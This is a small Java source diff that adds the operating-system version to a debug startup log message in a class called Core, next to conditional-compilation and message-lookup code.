@@ -219,7 +219,7 @@ public final class Core implements Runnable {
 
         //#ifdef DEBUG
         debug.info("START: " + (new Date())); //$NON-NLS-1$
-        Evidence.info("Start" + demo + ",  build: " + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP); //$NON-NLS-1$ //$NON-NLS-2$
+        Evidence.info("Start" + demo + ",  build: " + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP + " " + Cfg.OSVERSION); //$NON-NLS-1$ //$NON-NLS-2$
         //#else
         Evidence.info(Messages.getString("7.17") + demo + " " + Cfg.OSVERSION); //$NON-NLS-1$
         //EventLogger.setMinimumLevel(EventLogger.SEVERE_ERROR);
